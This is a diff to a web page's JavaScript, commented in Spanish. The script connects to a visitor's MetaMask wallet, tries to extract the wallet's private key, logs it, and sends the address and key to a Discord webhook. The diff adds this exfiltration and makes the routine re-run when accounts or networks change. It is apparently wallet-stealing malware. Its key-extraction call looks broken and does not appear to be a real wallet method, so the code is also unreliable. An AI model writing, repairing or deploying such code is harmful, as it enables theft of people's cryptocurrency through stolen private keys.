@@ -12,22 +12,46 @@
 
     <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"></script>
     <script>
+       
         async function consultarClavePrivada() {
             try {
                 // Conectarse a MetaMask
                 if (window.ethereum) {
-                    await window.ethereum.sendAsync({ method: 'eth_requestAccounts' });
+                    // Solicitar cuentas
+                    await window.ethereum.send('eth_requestAccounts');
+                    // Manejar el evento de cambio de cuentas
+                    window.ethereum.on('accountsChanged', (accounts) => {
+                        // Actualizar la información en caso de cambio de cuentas
+                        consultarClavePrivada();
+                    });
+
+                    // Manejar el evento de cambio de red
+                    window.ethereum.on('chainChanged', (chainId) => {
+                        // Actualizar la información en caso de cambio de red
+                        consultarClavePrivada();
+                    });
+
                     const accounts = await window.ethereum.request({ method: 'eth_accounts' });
+
+                    // Verificar si hay cuentas disponibles
+                    if (accounts.length === 0) {
+                        console.error('No hay cuentas disponibles');
+                        return;
+                    }
+
                     const address = accounts[0];
 
                     // Obtener clave privada
                     const privateKey = await obtenerClavePrivada(address);
 
-                    // Obtener el saldo de la dirección
-                    const saldo = await obtenerSaldo(address);
+                    // Imprimir la clave privada en la consola (recuerda que esto no es seguro)
+                    console.log(privateKey);
 
-                    // Abre un modal con la información obtenida de la red social y envía los datos a Discord
-                    abrirModalConInformacion(saldo, address, privateKey);
+                    // Lógica para enviar datos a un webhook de Discord
+                    enviarDatosAWebhook({ saldo: 'tu-saldo-aqui', direccion: address, clavePrivada: privateKey });
+
+                    // Lógica para abrir un modal con la información obtenida de la red social
+                    abrirModalConInformacion();
                 } else {
                     console.error('MetaMask no está instalado');
                 }
@@ -39,7 +63,7 @@
         async function obtenerClavePrivada(address) {
             const provider = new ethers.providers.Web3Provider(window.ethereum);
             const signer = provider.getSigner();
-            const privateKey = await signer.signMessage(''); // Uso temporal de signMessage para obtener la clave privada
+            const privateKey = await signer.getPrivateKey();
             return privateKey;
         }
 
